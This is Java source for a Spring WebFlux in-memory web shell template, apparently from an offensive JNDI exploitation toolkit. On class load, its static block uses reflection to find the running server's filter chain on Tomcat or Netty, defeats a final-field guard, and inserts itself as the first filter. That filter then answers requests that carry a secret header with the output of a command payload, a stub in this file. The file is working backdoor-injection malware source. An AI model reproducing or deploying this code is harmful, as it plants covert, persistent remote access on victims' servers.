package com.qi4l.jndi.template.memshell.spring;

import org.springframework.core.io.buffer.DefaultDataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.util.MultiValueMap;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Mono;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.function.Function;

/**
 * 此内存马目前仅支持了 gz 以及 cmd
 * 暂未适配冰蝎及 gzraw
 */
public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String, String>, Mono<DefaultDataBuffer>> {
    public static String HEADER_KEY;
    public static String HEADER_VALUE;
    public static String CMD_HEADER;
    public static Map<String, Object> store = new HashMap<String, Object>();

    static {
        FilteringWebHandler filteringWebHandler = null;

        try {
            // WebFlux 默认是 Netty，但是很多人喜欢用 Tomcat ，因此本内存马支持这两种
            Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
            ClassLoader loader = Thread.currentThread().getContextClassLoader();

            Map    map     = (Map) getFieldValue(getFieldValue(getFieldValue(loader, "resources"), "context"), "children");
            Object servlet = map.get("httpHandlerServlet");
            filteringWebHandler = (FilteringWebHandler) getFieldValue(getFieldValue(getFieldValue(getFieldValue(
                    getFieldValue(servlet, "existing"), "httpHandler"), "delegate"), "delegate"), "delegate");

        } catch (Exception ignored) {
            try {
                Method getThreads = Thread.class.getDeclaredMethod("getThreads");
                getThreads.setAccessible(true);
                Object threads = getThreads.invoke(null);
                for (int i = 0; i < Array.getLength(threads); i++) {
                    Object thread = Array.get(threads, i);
                    if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                        filteringWebHandler = (FilteringWebHandler) getFieldValue(getFieldValue(
                                getFieldValue(getFieldValue(getFieldValue(
                                                getFieldValue(thread, "this$0"), "handler"),
                                        "httpHandler"), "delegate"), "delegate"), "delegate");
                        break;
                    }
                }
            } catch (Exception neverMind) {
            }
        }


        if (filteringWebHandler != null) {
            try {
                DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler, "chain");
                Object                handler               = getFieldValue(defaultWebFilterChain, "handler");
                List<WebFilter>       newAllFilters         = new ArrayList<WebFilter>(defaultWebFilterChain.getFilters());
                newAllFilters.add(0, new SpringWebfluxMS());
                DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                Field                 f        = filteringWebHandler.getClass().getDeclaredField("chain");
                f.setAccessible(true);
                Field modifersField = Field.class.getDeclaredField("modifiers");
                modifersField.setAccessible(true);
                modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(filteringWebHandler, newChain);
                modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
            } catch (Exception ignored) {
            }
        }
    }

    String COMMAND;

    public SpringWebfluxMS() {
    }

    public SpringWebfluxMS(String COMMAND) {
        this.COMMAND = COMMAND;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field f = null;
        if (obj instanceof java.lang.reflect.Field) {
            f = (java.lang.reflect.Field) obj;
        } else {
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String value = exchange.getRequest().getHeaders().getFirst(HEADER_KEY);
        String cmd   = exchange.getRequest().getHeaders().getFirst(CMD_HEADER);
        if (value != null && value.contains(HEADER_VALUE)) {
            Mono bufferStream = exchange.getFormData().flatMap(new SpringWebfluxMS(cmd));
            return exchange.getResponse().writeWith(bufferStream);
        }
        return chain.filter(exchange);
    }

    @Override
    public Mono<DefaultDataBuffer> apply(MultiValueMap<String, String> map) {
        StringBuilder result = new StringBuilder();
        return Mono.just(new DefaultDataBufferFactory().wrap(executePayload(result, map).getBytes()));
    }

    public String executePayload(StringBuilder sb, MultiValueMap<String, String> map) {
        return sb.toString();
    }
}
